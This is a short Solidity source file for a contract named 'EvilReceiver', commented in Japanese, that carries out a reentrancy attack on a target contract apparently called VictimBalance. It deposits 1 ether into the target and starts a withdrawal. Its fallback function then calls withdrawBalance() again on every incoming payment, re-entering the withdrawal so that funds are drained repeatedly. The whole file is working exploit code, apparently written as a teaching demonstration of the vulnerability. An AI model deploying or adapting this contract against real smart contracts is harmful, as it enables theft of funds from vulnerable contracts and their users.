pragma solidity ^0.4.11;
contract  EvilReceiver {
	
	// 攻撃対象コントラクトのアドレス
	address public target;

	// メッセージ表示用のイベント
	event MessageLog(string);
	
	// 残高表示用のイベント
	event BalanceLog(uint);

	/// コンストラクタ
	function EvilReceiver(address _target) {
		target = _target;
	}
	
	/// Fallback関数
	function() payable{
		BalanceLog(this.balance);
		
		// VictimBalanceのwithdrawBalanceを呼出し
		if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))) {
			MessageLog("FAIL");
		} else {
			MessageLog("SUCCESS");
		} 
	}

	/// EOAからの送金時に利用する関数
	function addBalance() public payable {
	}

	/// 攻撃対象への送金時に利用する関数
	function sendEthToTarget() public {
		if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))) {throw;} 
	}

	///　攻撃対象からの引出し時に利用する関数
	function withdraw() public {
		if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;} 
	}
}